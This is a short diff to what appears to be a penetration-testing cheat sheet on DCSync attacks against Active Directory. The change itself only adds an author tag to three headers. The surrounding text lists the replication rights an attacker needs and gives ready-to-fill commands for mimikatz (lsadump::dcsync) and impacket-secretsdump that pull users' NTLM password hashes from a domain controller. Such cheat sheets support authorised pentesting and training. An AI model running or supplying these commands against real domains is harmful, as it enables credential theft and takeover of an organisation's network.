@@ -1,4 +1,4 @@
-% dcsync
+% sealldev, dcsync
 ; dcsync
 ; to perform a dcsync attack, the executing user needs to have the following rights:
 ;  • Replicating Directory Changes
@@ -9,13 +9,13 @@
 ;  • Enterprise Admins
 ;  • Administrators
 
-% mimikatz, ad auth attacks, dcsync
+% sealldev, mimikatz, ad auth attacks, dcsync
 @ windows-variables
 # get ntlm hash for user via dcsync attack using mimikatz 
 ; to perform dcsync attack with mimikatz you will need the SeDebugPrivilege permission on top of the ones listed above
 lsadump::dcsync /user:<domain>/<username>
 
-% impacket, ad auth attacks, dcsync
+% sealldev, impacket, ad auth attacks, dcsync
 @ windows-variables
 # get ntlm hash for user via dcsync attack using impacket-secretsdump
 impacket-secretsdump -just-dc-user <TARGET_USERNAME> <domain>/<USERNAME_TO_AUTH_AS>:'<password>'@<dc_ip>
